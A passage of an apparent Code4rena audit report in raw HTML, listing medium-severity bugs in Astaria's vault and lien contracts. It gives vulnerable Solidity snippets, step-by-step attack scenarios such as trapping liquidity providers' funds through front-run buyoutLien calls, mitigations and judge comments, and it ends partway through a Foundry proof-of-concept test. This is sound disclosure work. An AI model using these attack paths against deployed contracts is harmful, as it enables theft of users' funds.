width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Since our requirements for the size of deposit are so low, we can customize a formula that ensures we get a small final result in all cases. For example:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (ERC20(asset()).decimals() &lt; 4) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    return 10**(ERC20(asset()).decimals() - 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">else if (ERC20(asset()).decimals() &lt; 8) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    return 10**(ERC20(asset()).decimals() - 2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">} else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    return 10**(ERC20(asset()).decimals() - 6);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/367\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-15-overflow-potential-in-processepoch\" style=\"position:relative;\"><a href=\"#m-15-overflow-potential-in-processepoch\" aria-label=\"m 15 overflow potential in processepoch permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/362\">[M-15] Overflow potential in processEpoch()</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/362\">obront</a></em></p>\n<p>In <code>PublicVault.sol#processEpoch()</code>, we update the withdraw reserves based on how <code>totalAssets()</code> (the real amount of the underlying asset held by the vault) compares to the expected value in the withdraw proxy:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"85\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (totalAssets() &gt; expected) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      s.withdrawReserve = (totalAssets() - expected)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        .mulWadDown(s.liquidationWithdrawRatio)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        .safeCastTo88();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      s.withdrawReserve = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p>In the event that the <code>totalAssets()</code> is greater than expected, we take the surplus in assets multiply it by the withdraw ratio, and assign this value to <code>s.withdrawReserve</code>.</p>\n<p>However, because this logic is wrapped in an <code>unchecked</code> block, it must have confidence that this calculation does not overflow. Because the protocol allows arbitrary ERC20s to be used, it can’t have confidence in the size of <code>totalAssets()</code>, which opens up the possibility for an overflow in this function.</p>\n<h3 id=\"proof-of-concept-33\" style=\"position:relative;\"><a href=\"#proof-of-concept-33\" aria-label=\"proof of concept 33 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>mulWadDown</code> is calculated by first multiplying the two values, and then dividing by <code>1e18</code>. This is intended to prevent rounding errors with the division, but also means that an overflow is possible when the two values have been multiplied, before any division has taken place.</p>\n<p>This unchecked block is safe from overflows if:</p>\n<ul>\n<li><code>(totalAssets() - expected) * s.liquidationWithdrawRatio &#x3C; 1e88</code> (because s.withdrawRatio is 88 bytes)</li>\n<li><code>liquidationWithdrawRatio</code> is represented as a ratio of WAD, so it will be in the <code>1e17</code> - <code>1e18</code> range, let’s assume <code>1e17</code> to be safe</li>\n<li>therefore we require <code>totalAssets() - expected &#x3C; 1e61</code></li>\n</ul>\n<p>Although this is unlikely with most tokens, and certainly would have been safe in the previous iteration of the protocol that only used <code>WETH</code>, when allowing arbitrary ERC20 tokens, this is a risk.</p>\n<h3 id=\"recommended-mitigation-steps-32\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-32\" aria-label=\"recommended mitigation steps 32 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Remove the <code>unchecked</code> block around this calculation, or add an explicitly clause to handle the situation where <code>totalAssets()</code> gets too large for the current logic.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/362\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-16-withdrawproxy-allows-redeem-to-be-called-before-withdraw-reserves-are-transferred-in\" style=\"position:relative;\"><a href=\"#m-16-withdrawproxy-allows-redeem-to-be-called-before-withdraw-reserves-are-transferred-in\" aria-label=\"m 16 withdrawproxy allows redeem to be called before withdraw reserves are transferred in permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/358\">[M-16] WithdrawProxy allows <code>redeem()</code> to be called before withdraw reserves are transferred in</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/358\">obront</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/192\">unforgiven</a> and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/123\">rvierdiiev</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L152-L161\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L152-L161</a></p>\n<p>The WithdrawProxy contract has the <code>onlyWhenNoActiveAuction</code> modifier on the <code>withdraw()</code> and <code>redeem()</code> functions. This modifier stops these functions from being called when an auction is active:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"86\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">modifier onlyWhenNoActiveAuction() {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  WPStorage storage s = _loadSlot();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  if (s.finalAuctionEnd != 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    revert InvalidState(InvalidStates.NOT_CLAIMED);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  _;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Furthermore, both <code>withdraw()</code> and <code>redeem()</code> can only be called when <code>totalAssets() > 0</code> based on logic within those functions.</p>\n<p>The intention of these two checks is that the WithdrawProxy shares can only be cashed out after the PublicVault has called <code>transferWithdrawReserve</code>.</p>\n<p>However, because <code>s.finalAuctionEnd == 0</code> before an auction has started, and <code>totalAssets()</code> is calculated by taking the balance of the contract directly (<code>ERC20(asset()).balanceOf(address(this));</code>), a user may redeem their shares before the vault has been fully funded, and take less than their share of the balance, benefiting the other withdrawer.</p>\n<h3 id=\"proof-of-concept-34\" style=\"position:relative;\"><a href=\"#proof-of-concept-34\" aria-label=\"proof of concept 34 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ul>\n<li>A depositor decides to withdraw from the PublicVault and receives WithdrawProxy shares in return</li>\n<li>A malicious actor deposits a small amount of the underlying asset into the WithdrawProxy, making <code>totalAssets() > 0</code></li>\n<li>The depositor accidentally redeems, or is tricked into redeeming, from the WithdrawProxy, getting only a share of the small amount of the underlying asset rather than their share of the full withdrawal</li>\n<li>PublicVault properly processes epoch and full withdrawReserve is sent to WithdrawProxy</li>\n<li>All remaining holders of WithdrawProxy shares receive an outsized share of the withdrawReserve</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-33\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-33\" aria-label=\"recommended mitigation steps 33 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add an additional storage variable that is explicitly switched to <code>open</code> when it is safe to withdraw funds.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/358#issuecomment-1412910031\">SantiagoGregory (Astaria) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>This is intentional, the UI will block people from redeeming early. The option is there both to save some gas, and as a last resort if an LP urgently needs money (it will only make it better for the rest of the LPs).</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/358#issuecomment-1441319563\">Picodes (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I do consider this a valid medium severity issue, considering there is the <code>onlyWhenNoActiveAuction</code> so the intent of the code is not to block people from redeeming early but to prevent them from doing so. Note that the sponsor is right to highlight that it could be desirable to have an <code>emergencyRedeemFunction</code> where LPs do not wait for the completion of auctions.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-17-position-not-deleted-after-debt-paid\" style=\"position:relative;\"><a href=\"#m-17-position-not-deleted-after-debt-paid\" aria-label=\"m 17 position not deleted after debt paid permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/343\">[M-17] Position not deleted after debt paid</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/343\">fs0c</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/290\">obront</a> and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/217\">Lotus</a></em></p>\n<p>In <code>_paymentAH</code> function from LienToken.sol, the <code>stack</code> argument should be storage instead of memory. This bug was also disclosed in the Spearbit audit of this program and was resolved during here: <a href=\"https://github.com/AstariaXYZ/astaria-core/pull/201/commits/5a0a86837c0dcf2f6768e8a42aa4215666b57f11\">https://github.com/AstariaXYZ/astaria-core/pull/201/commits/5a0a86837c0dcf2f6768e8a42aa4215666b57f11</a>, but was later re-introduced <a href=\"https://github.com/AstariaXYZ/astaria-core/commit/be9a14d08caafe125c44f6876ebb4f28f06d83d4\">https://github.com/AstariaXYZ/astaria-core/commit/be9a14d08caafe125c44f6876ebb4f28f06d83d4</a> here. Marking it as high-severity as it was marked as same in the audit.</p>\n<h3 id=\"proof-of-concept-35\" style=\"position:relative;\"><a href=\"#proof-of-concept-35\" aria-label=\"proof of concept 35 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"87\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_paymentAH</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">LienStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">AuctionStack</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payment</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lienId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">end</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">end</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owing</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">amountOwed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//...[deleted lines to show bug]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienMeta</span><span class=\"mtk1\">[</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">]; </span><span class=\"mtk3\">//full delete</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">]; </span><span class=\"mtk3\">// &lt;- no effect on storage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>The position here is not deleted after the debt is paid as it is a memory pointer.</p>\n<h3 id=\"recommendation-3\" style=\"position:relative;\"><a href=\"#recommendation-3\" aria-label=\"recommendation 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>The first fix can be used again and it would work.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/343#issuecomment-1403986276\">androolloyd (Astaria) commented</a>:</strong></p>\n<blockquote>\n<p>So digging into this more since this payment flow is designed to run only once, and the state is stored inside the clearing house not the lien token, I’m not sure this matters, the deletion of the auction stack should be handled seperately inside the clearing house for the deposit.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/343\">SantiagoGregory (Astaria) acknowledged</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/343#issuecomment-1435712997\">Picodes (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The description of the impact of the finding is very brief for this issue and its duplicates.</p>\n<p>@androolloyd - the auction stack is in <code>ClearingHouse</code>, but the issue still stands as it is not deleted in <code>ClearingHouse</code> although it should be, right?</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/343#issuecomment-1442100489\">androolloyd (Astaria) commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p>@androolloyd - the auction stack is in <code>ClearingHouse</code>, but the issue still stands as it is not deleted in <code>ClearingHouse</code> although it should be, right?</p>\n</blockquote>\n<p>Yes, it should be.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-18-public-vault-owner-strategist-can-use-buyoutlien-to-indefinitely-prevent-liquidity-providers-from-withdrawing\" style=\"position:relative;\"><a href=\"#m-18-public-vault-owner-strategist-can-use-buyoutlien-to-indefinitely-prevent-liquidity-providers-from-withdrawing\" aria-label=\"m 18 public vault owner strategist can use buyoutlien to indefinitely prevent liquidity providers from withdrawing permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/324\">[M-18] Public vault owner (strategist) can use buyoutLien to indefinitely prevent liquidity providers from withdrawing</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/324\">evan</a></em></p>\n<p>By calling buyoutLien before transferWithdrawReserve() is invoked (front-run if necessary), Public vault owner (strategist) can indefinitely prevent liquidity providers from withdrawing. He now effectively owns all the fund in the public vault.</p>\n<h3 id=\"proof-of-concept-36\" style=\"position:relative;\"><a href=\"#proof-of-concept-36\" aria-label=\"proof of concept 36 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L295\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L295</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L421\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L421</a></p>\n<p>Before commitLien, transferWithdrawReserve() is invoked to transfer available funds from the public vault to the withdrawProxy of the previous epoch. However, this is not the case for buyoutLien.</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L372-L382\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L372-L382</a></p>\n<p>As soon as there’s fund is available in the vault, the strategist can call buyoutLien before any calls to transferWithdrawReserve(), and the withdrawProxy will need to continue to wait for available fund.</p>\n<p>The only thing that can break this cycle is a liquidation, but the strategist can prevent this from happening by only buying out liens from vaults he control where he only lends out to himself.</p>\n<p>Consider the following test. Even though there is enough fund in the vault for the liquidity provider’s withdrawal (60 ether), only less than 20 ethers ended up in the withdrawProxy when transferWithdrawReserve() is preceeded by buyoutLien().</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"88\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity =0.8.17;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;forge-std/Test.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {Authority} from &quot;solmate/auth/Auth.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {FixedPointMathLib} from &quot;solmate/utils/FixedPointMathLib.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {MockERC721} from &quot;solmate/test/utils/mocks/MockERC721.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  MultiRolesAuthority</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">} from &quot;solmate/auth/authorities/MultiRolesAuthority.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {ERC721} from &quot;gpl/ERC721.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {SafeCastLib} from &quot;gpl/utils/SafeCastLib.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {IAstariaRouter, AstariaRouter} from &quot;../AstariaRouter.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {VaultImplementation} from &quot;../VaultImplementation.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {PublicVault} from &quot;../PublicVault.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {TransferProxy} from 